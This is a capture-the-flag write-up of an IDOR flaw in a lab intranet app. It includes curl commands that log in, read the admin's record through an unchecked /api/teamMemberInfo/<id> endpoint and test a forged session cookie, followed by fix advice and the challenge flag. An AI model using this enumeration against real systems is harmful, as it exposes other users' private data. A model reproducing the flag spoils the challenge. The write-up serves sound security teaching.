# Acme Intranet Session-Tied IDOR Bypass

## What Is Happening

The [Acme Intranet lab](https://2060640a8540.pwnbox-lab.com/) logs in `demo/demo`, stores a signed session cookie containing `{"uid":42}`, and renders the signed-in user's profile from `/api/me`.

The challenge claims the user id is tied to the session and cannot be tampered with. That is true for `/api/me`, but a second endpoint still accepts a raw numeric user id and returns sensitive data.

## Why It Happens

`/api/me` derives the current user from the signed `session` cookie. Tampering the cookie or dropping `session.sig` returns `401`.

However, `/js/team.js` documents a dormant team-directory API:

```text
GET /api/teamMemberInfo/<numeric user id>
→ { id, username, name, email, title, secret }
```

That endpoint performs no ownership check. Any authenticated user can request another member's record by changing the id in the URL.

The dashboard announcement names **Mira (#1, admin)**, giving a high-value enumeration target.

## Exploit Chain

1. Log in as `demo/demo`.
2. Recon JavaScript bundles for alternate APIs that accept object ids.
3. Request `GET /api/teamMemberInfo/1`.
4. Read the `secret` field from the response.

## Exact Test

Login and IDOR read:

```bash
curl -sS -c /tmp/cj -X POST 'https://2060640a8540.pwnbox-lab.com/api/login' \
  -H 'content-type: application/json' \
  -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/teamMemberInfo/1'
```

Control — session-bound profile has no secret:

```bash
curl -sS -b /tmp/cj 'https://2060640a8540.pwnbox-lab.com/api/me'
```

Control — session tampering fails:

```bash
curl -sS 'https://2060640a8540.pwnbox-lab.com/api/me' \
  -H 'Cookie: session=eyJ1aWQiOjF9; session.sig=invalid'
```

## Expected Signal

- `/api/me` returns only the signed-in user's public profile fields.
- `/api/teamMemberInfo/42` returns demo's record with a placeholder secret.
- `/api/teamMemberInfo/1` returns admin data including the flag in `secret`.
- Forged session cookies are rejected on `/api/me`.

## Result Interpretation

Confirmed bug chain:

```text
Signed session protects /api/me
-> developer assumes id cannot be abused
-> dormant /api/teamMemberInfo/:id accepts arbitrary ids
-> no ownership check on alternate endpoint
-> horizontal/vertical read of secret field
```

## Root Cause

Authorization was implemented on one endpoint but not across all routes that reference user objects by id.

## Impact

- Read other users' profile data and sensitive `secret` values.
- In real systems, similar endpoints may expose SSNs, salary, tokens, internal notes, or admin-only fields.

## Fix

- Enforce object-level authorization on every id-parameter endpoint.
- Return sensitive fields only when `requested_id == session_user_id` or the caller has an explicit admin role.
- Remove unused APIs from production bundles or protect them server-side.
- Add regression tests for all object-reference routes, not only the main profile API.

## Key Lesson

Securing the "main" profile route does not secure the application. If any endpoint still accepts a user-controlled id, test it for IDOR even when the developer claims ids are session-bound elsewhere.

## Flag

`pwnbox{4880226857ecdeb7a41ec5d664ddbd50}`
